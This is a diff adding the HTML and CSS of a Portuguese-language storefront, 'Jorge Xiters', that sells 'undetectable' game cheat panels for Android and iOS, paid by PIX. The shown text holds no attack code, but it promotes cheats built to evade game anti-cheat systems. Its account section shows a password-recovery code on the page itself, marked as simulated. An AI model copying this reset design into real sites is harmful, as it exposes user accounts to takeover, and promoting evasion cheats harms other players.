@@ -1,0 +1,1905 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jorge Xiters - Cheats e Autenticação</title>
+  <style>
+    /* Reset CSS básico para remover margens e paddings padrão */
+    * {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: #0f0f0f;
+      color: #fff;
+      overflow-x: hidden; /* Evita rolagem horizontal indesejada */
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Estilos do Header e Menu de Navegação */
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: rgba(15, 15, 15, 0.95);
+      backdrop-filter: blur(10px);
+      z-index: 1000; /* Garante que o header fique acima de outros elementos */
+      border-bottom: 1px solid rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+    }
+
+    .nav-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #9932CC; /* Roxo principal */
+      text-decoration: none;
+      text-shadow: 0 0 10px rgba(153, 50, 204, 0.5); /* Efeito de brilho no logo */
+    }
+
+    .nav-links {
+      list-style: none;
+      display: flex; /* Links dispostos em linha para desktop */
+    }
+
+    .nav-links li a {
+      color: #fff;
+      text-decoration: none;
+      padding: 10px 15px;
+      transition: color 0.3s ease, background 0.3s ease, transform 0.3s ease;
+      border-radius: 5px;
+      position: relative; /* Para o efeito de brilho */
+      overflow: hidden; /* Para esconder o brilho fora do link */
+    }
+
+    /* Efeito de brilho nos links ao passar o mouse */
+    .nav-links li a::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(153, 50, 204, 0.1), transparent); /* Roxo com transparência */
+      transition: left 0.5s ease;
+    }
+
+    .nav-links li a:hover::before {
+      left: 100%;
+    }
+
+    .nav-links li a:hover,
+    .nav-links li a.active {
+      color: #9932CC; /* Roxo principal */
+      background: rgba(153, 50, 204, 0.1); /* Roxo com transparência */
+      box-shadow: 0 0 20px rgba(153, 50, 204, 0.3); /* Roxo com transparência */
+      transform: translateY(-2px); /* Pequeno efeito de elevação */
+    }
+
+    /* Hamburger menu (para telas menores) */
+    .hamburger-menu {
+      display: none; /* Escondido por padrão, só aparece em mobile */
+      flex-direction: column;
+      cursor: pointer;
+      z-index: 1001; /* Garante que o hambúrguer esteja acima do menu aberto */
+    }
+
+    .hamburger-menu div {
+      width: 25px;
+      height: 3px;
+      background: #9932CC; /* Roxo principal */
+      margin: 4px 0;
+      transition: all 0.3s ease;
+    }
+
+    /* Animação do ícone hambúrguer */
+    .hamburger-menu.active div:nth-child(1) {
+      transform: rotate(45deg) translate(5px, 5px);
+    }
+
+    .hamburger-menu.active div:nth-child(2) {
+      opacity: 0;
+    }
+
+    .hamburger-menu.active div:nth-child(3) {
+      transform: rotate(-45deg) translate(7px, -6px);
+    }
+
+    /* Media Queries para responsividade */
+    @media (max-width: 768px) {
+      /* ESCONDE A NAVEGAÇÃO DE DESKTOP POR PADRÃO, PARA QUE SÓ O HAMBURGUER APAREÇA */
+      .nav-container nav {
+        display: none; /* Esconde a navegação padrão em telas pequenas */
+      }
+      
+      /* MOSTRA A NAVEGAÇÃO QUANDO O HAMBURGUER ESTIVER ATIVO */
+      .nav-links {
+        display: flex; /* Sempre flex para mobile */
+        flex-direction: column;
+        width: 100%;
+        position: absolute;
+        top: 60px; /* Abaixo do header */
+        left: 0;
+        background: rgba(15, 15, 15, 0.98); /* Fundo mais opaco para o menu */
+        border-top: 1px solid rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+        padding: 0; /* Começa sem padding vertical para animação */
+        overflow: hidden;
+        max-height: 0; /* Escondido por padrão */
+        transition: max-height 0.4s ease-out, padding 0.4s ease-out; /* Transição suave */
+        z-index: 999; /* Fica abaixo do header, mas acima do conteúdo */
+      }
+
+      .nav-links.active {
+        max-height: 500px; /* Altura suficiente para mostrar todos os links */
+        padding-bottom: 20px; /* Adiciona padding quando ativo */
+      }
+
+      .nav-links li {
+        text-align: center;
+        padding: 10px 0; /* Padding dentro de cada item do menu */
+      }
+
+      .hamburger-menu {
+        display: flex; /* Mostra o hambúrguer no mobile */
+      }
+
+      .nav-links .hide-on-desktop {
+        display: none;
+      }
+      .nav-links.active .hide-on-desktop {
+          display: block; /* Garante que ele apareça no menu mobile quando ativo */
+      }
+    }
+    
+    /* Estilos das Seções de Conteúdo (Painéis) */
+    .panel {
+      display: none; /* Esconde todos os painéis por padrão */
+      min-height: calc(100vh - 80px); /* Garante que o painel ocupe a altura restante */
+      padding-top: 80px; /* Espaço para o header fixo */
+      opacity: 0;
+      transition: opacity 0.5s ease-in-out;
+      animation: fadeIn 0.8s forwards; /* Efeito de fade ao aparecer */
+    }
+
+    .panel.active {
+      display: block; /* Mostra o painel ativo */
+      opacity: 1;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .content-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    /* Estilos da seção Home */
+    #home { /* Renomeado de homePanel */
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 100px 20px;
+      min-height: calc(100vh - 80px); /* Garante que a home ocupe a altura total da tela */
+    }
+
+    #home h1 {
+      font-size: 3em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    #home p {
+      font-size: 1.2em;
+      line-height: 1.6;
+      margin-bottom: 30px;
+      max-width: 800px;
+      color: #ccc;
+    }
+
+    .cta-button {
+      display: inline-block;
+      background: #9932CC; /* Roxo principal */
+      color: #0f0f0f;
+      padding: 15px 30px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      transition: background 0.3s ease, transform 0.3s ease;
+      box-shadow: 0 5px 15px rgba(153, 50, 204, 0.3); /* Roxo com transparência */
+      cursor: pointer; /* Adicionado cursor pointer */
+    }
+
+    .cta-button:hover {
+      background: #800080; /* Roxo mais escuro no hover */
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    /* Estilos para o aviso de pagamentos */
+    .payment-info-box {
+        margin-top: 50px;
+        background: rgba(255, 0, 0, 0.1); /* Fundo avermelhado leve */
+        border: 1px solid rgba(255, 0, 0, 0.4); /* Borda vermelha */
+        border-radius: 8px;
+        padding: 20px;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .payment-info-box p {
+        font-size: 1.1em;
+        color: #ffcccc; /* Texto claro avermelhado */
+        margin-bottom: 10px;
+    }
+
+    .payment-info-box strong {
+        color: #ff6666; /* Vermelho mais forte */
+    }
+
+    /* Estilos da seção Serviços */
+    #servicos { /* Renomeado de servicosPanel */
+      padding-top: 80px;
+      text-align: center;
+    }
+
+    #servicos h2 {
+      font-size: 2.5em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    .servicos-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 30px;
+      padding: 0 20px;
+    }
+
+    .servico-item {
+      background: rgba(153, 50, 204, 0.05); /* Roxo com transparência */
+      border: 1px solid rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+      border-radius: 10px;
+      padding: 30px;
+      text-align: left;
+      transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
+      cursor: pointer;
+    }
+
+    .servico-item:hover {
+      transform: translateY(-5px);
+      background: rgba(153, 50, 204, 0.1); /* Roxo com transparência */
+      box-shadow: 0 10px 20px rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+    }
+
+    .servico-item h3 {
+      color: #9932CC; /* Roxo principal */
+      font-size: 1.8em;
+      margin-bottom: 15px;
+    }
+
+    .servico-item p {
+      font-size: 1em;
+      line-height: 1.5;
+      color: #bbb;
+    }
+
+    /* Estilos da seção Planos */
+    #planos { /* Renomeado de planosPanel */
+      padding-top: 80px;
+      text-align: center;
+    }
+
+    #planos h2 {
+      font-size: 2.8em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 50px;
+      text-shadow: 0 0 20px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    .planos-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 30px;
+      padding: 0 20px;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .plano-item {
+      background: #2a2a2a;
+      border: 2px solid #9932CC; /* Roxo principal */
+      border-radius: 15px;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 5px 15px rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .plano-item:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 8px 25px rgba(153, 50, 204, 0.4); /* Roxo com transparência */
+    }
+
+    .plano-item h3 {
+      color: #9932CC; /* Roxo principal */
+      font-size: 2.2em;
+      margin-bottom: 20px;
+    }
+
+    .plano-item .price {
+      font-size: 3.5em;
+      font-weight: bold;
+      color: #fff;
+      margin-bottom: 20px;
+    }
+
+    .plano-item .price span {
+      font-size: 0.5em;
+      vertical-align: super;
+    }
+
+    .plano-item ul {
+      list-style: none;
+      text-align: left;
+      margin-bottom: 30px;
+      flex-grow: 1; /* Faz a lista ocupar o espaço restante */
+    }
+
+    .plano-item ul li {
+      margin-bottom: 10px;
+      color: #ddd;
+      font-size: 1.1em;
+    }
+
+    .plano-item ul li::before {
+      content: '✓';
+      color: #9932CC; /* Roxo principal */
+      margin-right: 10px;
+      font-weight: bold;
+    }
+
+    .plano-item .buy-button {
+      display: inline-block;
+      background: #9932CC; /* Roxo principal */
+      color: #0f0f0f;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease;
+      width: 100%;
+      box-shadow: 0 3px 10px rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+    }
+
+    .plano-item .buy-button:hover {
+      background: #800080; /* Roxo mais escuro no hover */
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(153, 50, 204, 0.4); /* Roxo com transparência */
+    }
+
+    /* Estilos para as imagens dos painéis */
+    .plano-item .panel-screenshot {
+      max-width: 100%; /* Garante que a imagem se ajuste ao item do plano */
+      height: auto;
+      border-radius: 8px;
+      margin-top: 20px; /* Espaçamento da lista */
+      margin-bottom: 10px; /* Espaçamento do botão */
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Sombra para a imagem */
+    }
+
+    /* Estilos da seção Sobre */
+    #about { /* Renomeado de aboutPanel */
+      padding-top: 80px;
+      text-align: center;
+    }
+
+    #about h2 {
+      font-size: 2.5em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    #about p {
+      font-size: 1.1em;
+      line-height: 1.7;
+      color: #ccc;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    /* Estilos da seção Contato */
+    #contato { /* Renomeado de contatoPanel */
+      padding-top: 80px;
+      text-align: center;
+    }
+
+    #contato h2 {
+      font-size: 2.5em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    #contato p {
+      font-size: 1.1em;
+      line-height: 1.6;
+      color: #ccc;
+      margin-bottom: 15px;
+    }
+
+    #contato a {
+      color: #9932CC; /* Roxo principal */
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s ease;
+    }
+
+    #contato a:hover {
+      color: #800080; /* Roxo mais escuro no hover */
+    }
+
+    /* --- NOVOS ESTILOS PARA AUTENTICAÇÃO E CONTA --- */
+    .auth-container, .account-container, .orders-container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      background: #0f0f0f;
+      color: #fff;
+    }
+
+    .auth-form, .account-details {
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(153, 50, 204, 0.3); /* Roxo com transparência */
+      max-width: 450px;
+      width: 100%;
+      text-align: center;
+      margin-top: 60px; /* Para não ficar atrás do header */
+    }
+
+    .auth-form h2, .account-details h2 {
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 30px;
+      font-size: 2.2em;
+    }
+
+    .auth-form label, .account-details label {
+      display: block;
+      text-align: left;
+      margin-bottom: 8px;
+      color: #ddd;
+      font-size: 1em;
+    }
+
+    .auth-form input[type="email"],
+    .auth-form input[type="password"],
+    .account-details input[type="password"],
+    .account-details input[type="email"] {
+      width: calc(100% - 20px);
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #9932CC; /* Roxo principal */
+      border-radius: 8px;
+      background: #0f0f0f;
+      color: #fff;
+      font-size: 1em;
+    }
+
+    .auth-form input:focus,
+    .account-details input:focus {
+      outline: none;
+      border-color: #800080; /* Roxo mais escuro no focus */
+      box-shadow: 0 0 8px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    .main-auth-button, .action-button {
+      background: #9932CC; /* Roxo principal */
+      color: #0f0f0f;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    .main-auth-button:hover, .action-button:hover {
+      background: #800080; /* Roxo mais escuro no hover */
+      transform: translateY(-2px);
+    }
+
+    .switch-auth-mode-button {
+      background: none;
+      border: none;
+      color: #9932CC; /* Roxo principal */
+      cursor: pointer;
+      font-size: 0.95em;
+      margin-top: 10px;
+      transition: color 0.3s ease;
+    }
+
+    .switch-auth-mode-button:hover {
+      color: #800080; /* Roxo mais escuro no hover */
+      text-decoration: underline;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .hidden-content {
+      display: none;
+    }
+
+    /* Seção de Account */
+    #account .account-details {
+      padding: 30px;
+      margin-top: 80px; /* Espaço para o header */
+      text-align: left;
+    }
+    #account .account-details p {
+        color: #ccc;
+        margin-bottom: 20px;
+    }
+    #account .account-details button {
+        margin-top: 10px;
+    }
+    .password-change, .forgot-password-section {
+        border-top: 1px solid rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+        padding-top: 20px;
+        margin-top: 20px;
+    }
+    .password-change h3, .forgot-password-section h3 {
+        color: #9932CC; /* Roxo principal */
+        margin-bottom: 15px;
+        font-size: 1.5em;
+    }
+    .password-change button, .forgot-password-section button {
+        margin-top: 15px;
+    }
+    .recovery-code-input-section p {
+        font-size: 0.9em;
+        color: #aaa;
+        margin-bottom: 10px;
+    }
+    .recovery-code-input-section span {
+        font-weight: bold;
+        color: #9932CC; /* Roxo principal */
+    }
+
+    /* Seção de Pedidos Concluídos */
+    #completed-orders {
+        padding-top: 80px;
+        text-align: center;
+    }
+    #completed-orders h2 {
+      font-size: 2.5em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+    .completed-orders-list {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 20px;
+        max-width: 1000px;
+        margin: 0 auto;
+        padding: 0 20px;
+    }
+    .order-card {
+        background: #2a2a2a;
+        border: 1px solid #9932CC; /* Roxo principal */
+        border-radius: 10px;
+        padding: 20px;
+        text-align: left;
+        box-shadow: 0 5px 15px rgba(153, 50, 204, 0.1); /* Roxo com transparência */
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+    .order-card p {
+        margin-bottom: 8px;
+        color: #ddd;
+    }
+    .order-card strong {
+        color: #9932CC; /* Roxo principal */
+    }
+    .empty-message {
+        color: #ccc;
+        font-size: 1.2em;
+        margin-top: 50px;
+    }
+
+    /* Estilos do formulário de pagamento (Modal, por cima de tudo) */
+    #paymentForm {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      backdrop-filter: blur(8px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000; /* Garante que fique acima de tudo */
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    #paymentForm.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .payment-content {
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(153, 50, 204, 0.3); /* Roxo com transparência */
+      max-width: 500px;
+      width: 90%;
+      position: relative;
+    }
+
+    .close-button {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      color: #9932CC; /* Roxo principal */
+      font-size: 2em;
+      cursor: pointer;
+      transition: color 0.3s ease;
+    }
+
+    .close-button:hover {
+      color: #800080; /* Roxo mais escuro no hover */
+    }
+
+    .payment-content h2 {
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 30px;
+      font-size: 2em;
+    }
+
+    .payment-content p {
+        font-size: 1.1em;
+        color: #ddd;
+        margin-bottom: 15px;
+    }
+    .payment-content p span {
+        font-weight: bold;
+        color: #9932CC; /* Roxo principal */
+    }
+
+    .payment-content label {
+      display: block;
+      margin-bottom: 10px;
+      color: #ddd;
+      text-align: left;
+      font-size: 1.1em;
+    }
+
+    .payment-content input[type="text"],
+    .payment-content input[type="email"] {
+      width: calc(100% - 20px); /* Ajustado para preencher a largura com padding */
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #9932CC; /* Roxo principal */
+      border-radius: 8px;
+      background: #0f0f0f;
+      color: #fff;
+      font-size: 1em;
+    }
+
+    .payment-content input[type="text"]:focus,
+    .payment-content input[type="email"]:focus {
+      outline: none;
+      border-color: #800080; /* Roxo mais escuro no focus */
+      box-shadow: 0 0 8px rgba(153, 50, 204, 0.5); /* Roxo com transparência */
+    }
+
+    .payment-content button.confirm-button {
+      background: #9932CC; /* Roxo principal */
+      color: #0f0f0f;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease;
+      width: 100%;
+      box-shadow: 0 3px 10px rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+    }
+
+    .payment-content button.confirm-button:hover {
+      background: #800080; /* Roxo mais escuro no hover */
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(153, 50, 204, 0.4); /* Roxo com transparência */
+    }
+
+    #pixInfo {
+      margin-top: 30px;
+      border-top: 1px solid rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+      padding-top: 20px;
+      display: none; /* Inicia oculto */
+    }
+
+    #pixInfo h3 {
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 15px;
+      font-size: 1.8em;
+    }
+
+    #pixQRImage {
+      max-width: 180px;
+      height: auto;
+      border: 2px solid #9932CC; /* Roxo principal */
+      border-radius: 5px;
+      margin-bottom: 15px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .pix-instructions {
+      font-size: 1em;
+      color: #bbb;
+      margin-bottom: 10px;
+    }
+
+    .pix-value-display {
+      font-size: 1.5em;
+      color: #fff;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .copy-button {
+      background: #800080; /* Roxo mais escuro para o botão de copiar */
+      color: #0f0f0f;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 2px 8px rgba(153, 50, 204, 0.2); /* Roxo com transparência */
+    }
+
+    .copy-button:hover {
+      background: #6A0DAD; /* Roxo ainda mais escuro no hover */
+      transform: translateY(-1px);
+    }
+
+    #pixCopyPaste {
+      background: #0f0f0f;
+      color: #9932CC; /* Roxo principal */
+      padding: 10px;
+      border: 1px solid #9932CC; /* Roxo principal */
+      border-radius: 5px;
+      word-break: break-all; /* Garante que o texto longo não quebre o layout */
+      font-family: 'Courier New', monospace;
+      font-size: 0.9em;
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    .back-button {
+      background: #444;
+      margin-top: 20px;
+      box-shadow: none;
+    }
+
+    .back-button:hover {
+      background: #555;
+      transform: translateY(-1px);
+    }
+
+    /* Estilos para o Canvas de Partículas de Fundo */
+    #particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1; /* Fica atrás de todo o conteúdo */
+    }
+
+    /* NOVO CSS PARA O EFEITO DE TOQUE/CLIQUE */
+    .touch-ripple {
+      position: absolute; /* Para posicionar em relação ao ponto de clique */
+      border-radius: 50%; /* Faz um círculo */
+      background-color: rgba(153, 50, 204, 0.4); /* Roxo com transparência */
+      pointer-events: none; /* Garante que o clique passe para os elementos abaixo */
+      transform: scale(0); /* Começa invisível e pequeno */
+      opacity: 1; /* Começa opaco */
+      animation: ripple-effect 0.6s ease-out forwards; /* Animação */
+      z-index: 9999; /* Garante que fique acima de tudo */
+    }
+
+    @keyframes ripple-effect {
+      to {
+        transform: scale(2); /* Expande o círculo */
+        opacity: 0; /* Desaparece */
+      }
+    }
+
+    /* Estilos da seção Termos */
+    #termos {
+      padding-top: 80px;
+      text-align: center;
+    }
+
+    #termos h2 {
+      font-size: 2.5em;
+      color: #9932CC; /* Roxo principal */
+      margin-bottom: 40px;
+      text-shadow: 0 0 15px rgba(153, 50, 204, 0.5);
+    }
+
+    .terms-content {
+      text-align: left; /* Alinha o texto dentro da caixa */
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px;
+      background: rgba(153, 50, 204, 0.05); /* Roxo com transparência */
+      border: 1px solid rgba(153, 50, 204, 0.2);
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(153, 50, 204, 0.1);
+    }
+
+    .terms-content h3 {
+      color: #9932CC; /* Roxo principal */
+      font-size: 1.6em;
+      margin-top: 25px;
+      margin-bottom: 10px;
+    }
+
+    .terms-content p {
+      font-size: 1.05em;
+      line-height: 1.8;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <canvas id="particles"></canvas>
+
+  <header class="header">
+    <div class="nav-container">
+      <a href="#" class="logo">Jorge Xiters</a>
+      
+      <nav>
+        <ul class="nav-links" id="navMenu">
+          <li><a href="#home" class="nav-link active" data-section="home">Home</a></li>
+          <li><a href="#servicos" class="nav-link" data-section="servicos">Serviços</a></li>
+          <li class="hide-on-desktop"><a href="#planos" class="nav-link" data-section="planos">Planos</a></li> 
+          <li><a href="#account" class="nav-link" data-section="account">Conta</a></li>
+          <li><a href="#completed-orders" class="nav-link" data-section="completed-orders">Meus Pedidos</a></li>
+          <li class="hide-on-desktop"><a href="#termos" class="nav-link" data-section="termos">Termos</a></li> 
+          <li><a href="#about" class="nav-link" data-section="about">Sobre</a></li>
+          <li><a href="#contato" class="nav-link" data-section="contato">Contato</a></li>
+        </ul>
+      </nav>
+
+      <div class="hamburger-menu" id="hamburger" onclick="toggleMenu()">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+  </header>
+
+  <div id="authScreen" class="auth-container">
+    <form class="auth-form" id="authForm">
+      <h2 id="authTitle">Login</h2>
+      <label for="authEmailInput">Email:</label>
+      <input type="email" id="authEmailInput" placeholder="Seu email" required>
+      <label for="authPasswordInput">Senha:</label>
+      <input type="password" id="authPasswordInput" placeholder="Sua senha" required>
+      <button type="submit" class="main-auth-button" id="mainAuthButton">Entrar</button>
+      <button type="button" class="switch-auth-mode-button" id="switchAuthModeButton">Não tem uma conta? Crie uma!</button>
+    </form>
+  </div>
+
+  <main id="mainContent" class="hidden-content">
+    <section id="home" class="panel">
+      <div class="content-container">
+        <h1>Bem-vindo ao Jorge Xiters</h1>
+        <p>A melhor experiência em cheats de alto desempenho e segurança para os seus jogos favoritos. Domine seus inimigos e eleve sua jogabilidade a um novo nível.</p>
+        <a href="#planos" class="cta-button" onclick="showMainSection('planos')">Ver Planos</a>
+
+        <div class="payment-info-box">
+            <p><strong>Banco Inter e PicPay estão proibidos.</strong></p>
+            <p>Todas as compras são processadas exclusivamente via <strong>PIX</strong> para sua segurança e agilidade.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="servicos" class="panel">
+      <div class="content-container">
+        <h2>O que Oferecemos</h2>
+        <div class="servicos-grid">
+          <div class="servico-item">
+            <h3>Cheats Indetectáveis</h3>
+            <p>Nossos cheats são desenvolvidos com tecnologia de ponta para garantir máxima segurança e evitar detecções.</p>
+          </div>
+          <div class="servico-item">
+            <h3>Atualizações Constantes</h3>
+            <p>Mantemos nossos cheats sempre atualizados com as últimas versões dos jogos, garantindo compatibilidade e funcionalidade.</p>
+          </div>
+          <div class="servico-item">
+            <h3>Suporte Dedicado</h3>
+            <p>Nossa equipe de suporte está pronta para ajudar você a resolver qualquer dúvida ou problema rapidamente.</p>
+          </div>
+          <div class="servico-item">
+            <h3>Desempenho Otimizado</h3>
+            <p>Cheats leves que não afetam o desempenho do seu jogo, garantindo uma experiência fluida e sem travamentos.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="planos" class="panel">
+      <div class="content-container">
+        <h2>Nossos Planos</h2>
+        <div class="planos-grid">
+          <div class="plano-item" data-plan-name="Painel Android Permanente" data-plan-price="29.90">
+            <h3>Painel AND PERM</h3>
+            <p class="price">R$ 29<span>,90</span></p>
+            <ul>
+              <li>Acesso Vitalício Android</li>
+              <li>Cheats Essenciais Android</li>
+              <li>Atualizações Básicas</li>
+              <li>Suporte via Email</li>
+            </ul>
+            <img src="imagem/and.png" alt="Interface do Painel Android" class="panel-screenshot">
+            <button class="buy-button" onclick="openPaymentForm(this)">Comprar Agora</button>
+          </div>
+
+          <div class="plano-item" data-plan-name="Painel iOS 7 Dias" data-plan-price="34.80">
+            <h3>Painel IOS 7D</h3>
+            <p class="price">R$ 34<span>,80</span></p>
+            <ul>
+              <li>Acesso iOS por 7 Dias</li>
+              <li>Cheats Básicos iOS</li>
+              <li>Atualizações Diárias</li>
+              <li>Suporte Prioritário</li>
+            </ul>
+            <img src="imagem/ios.png" alt="Interface do Painel iOS" class="panel-screenshot">
+            <button class="buy-button" onclick="openPaymentForm(this)">Comprar Agora</button>
+          </div>
+
+          <div class="plano-item" data-plan-name="Painel iOS 15 Dias" data-plan-price="44.90">
+            <h3>Painel IOS 15D</h3>
+            <p class="price">R$ 44<span>,90</span></p>
+            <ul>
+              <li>Acesso iOS por 15 Dias</li>
+              <li>Cheats Avançados iOS</li>
+              <li>Atualizações Rápidas</li>
+              <li>Suporte VIP</li>
+            </ul>
+            <button class="buy-button" onclick="openPaymentForm(this)">Comprar Agora</button>
+          </div>
+
+          <div class="plano-item" data-plan-name="Painel iOS Permanente" data-plan-price="76.80">
+            <h3>Painel IOS PERM</h3>
+            <p class="price">R$ 76<span>,80</span></p>
+            <ul>
+              <li>Acesso Vitalício iOS</li>
+              <li>Todos os Cheats iOS</li>
+              <li>Atualizações Instantâneas</li>
+              <li>Suporte Dedicado 24/7</li>
+            </ul>
+            <button class="buy-button" onclick="openPaymentForm(this)">Comprar Agora</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="account" class="panel">
+      <div class="account-container">
+        <div class="account-details">
+          <h2>Minha Conta</h2>
+          <p>Usuário logado: <strong id="loggedInUserEmailDisplay">N/A</strong></p>
+
+          <div class="password-change" id="passwordChangeSection">
+            <h3>Alterar Senha</h3>
+            <label for="newPassword">Nova Senha:</label>
+            <input type="password" id="newPassword" placeholder="Digite sua nova senha">
+            <label for="confirmNewPassword">Confirmar Nova Senha:</label>
+            <input type="password" id="confirmNewPassword" placeholder="Confirme sua nova senha">
+            <button class="action-button" id="changePasswordButton">Alterar Senha</button>
+            <button type="button" class="switch-auth-mode-button" id="forgotPasswordToggle">Esqueceu a senha?</button>
+          </div>
+
+          <div class="forgot-password-section hidden" id="forgotPasswordSection">
+            <h3>Redefinir Senha</h3>
+            <label for="forgotEmail">Seu E-mail:</label>
+            <input type="email" id="forgotEmail" placeholder="Digite seu email de recuperação">
+            <button class="action-button" id="sendRecoveryCodeButton">Enviar Código de Recuperação</button>
+
+            <div class="recovery-code-input-section hidden" id="recoveryCodeInputSection">
+              <p>Código de recuperação (SIMULADO): <span id="displayedRecoveryCode"></span></p>
+              <label for="recoveryCode">Digite o Código:</label>
+              <input type="text" id="recoveryCode" placeholder="Código recebido">
+              <label for="resetNewPassword">Nova Senha:</label>
+              <input type="password" id="resetNewPassword" placeholder="Sua nova senha">
+              <label for="resetConfirmNewPassword">Confirmar Nova Senha:</label>
+              <input type="password" id="resetConfirmNewPassword" placeholder="Confirme a nova senha">
+              <button class="action-button" id="resetPasswordButton">Redefinir Senha</button>
+            </div>
